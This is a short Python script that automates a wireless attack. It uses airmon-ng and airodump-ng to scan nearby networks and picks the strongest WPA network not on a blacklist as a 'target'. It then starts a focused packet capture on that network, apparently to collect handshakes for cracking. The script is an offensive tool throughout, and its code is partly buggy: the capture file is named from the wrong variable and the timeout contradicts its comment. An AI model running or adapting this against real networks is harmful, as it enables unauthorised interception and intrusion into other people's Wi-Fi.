import os
import time
from subprocess import Popen, call

# Don't try to read these
blackList = [ "Example AP" ]

# setup airmon
call(["airmon-ng", "stop", "wlan0"])
call(["airmon-ng", "start", "wlan0", "1"])

# setup airodump on a timer
p = Popen(["airodump-ng", "wlan0mon", "-o" ,"csv", "-w", "airattacktmp"])

# run for 60 seconds
timeout = 5
endtime = time.time() + timeout

while time.time() < endtime:
    time.sleep(0.4)

if p.poll() is None:
    p.terminate()
    p.wait()

# parse the file
with open('airattacktmp-01.csv') as f:
    bssids = f.read().split("\r\n\r\n")[0]

keys = ['bssid', 'first_seen', 'last_seen', 'channel', 'speed', 'privacy', 'cipher', 'authentication', 'power', 'beacons', 'ivs', 'lan', 'id-length', 'essid', 'key']
cells = []
for line in bssids.split('\r\n')[2:]:
    cell = dict(zip(keys, [cell.strip() for cell in line.split(',')]))
    if cell["power"] != '-1': # sometimes we get strays
        cells.append(cell)

# delete our temporary file
os.remove("airattacktmp-01.csv")

# ssids we don't want to try to capture
bestCell = None
bestSignal = 999
for cell in cells:
    if abs(int(cell["power"])) < bestSignal and 'WPA' in cell["privacy"] and cell["essid"] not in blackList:
        bestSignal = abs(int(cell["power"]))
        bestCell = cell

print "Target Acquired - " + bestCell["essid"]

call(["airodump-ng", "wlan0mon", "-c", bestCell["channel"], "--bssid", bestCell["bssid"], "-w", cell["essid"]])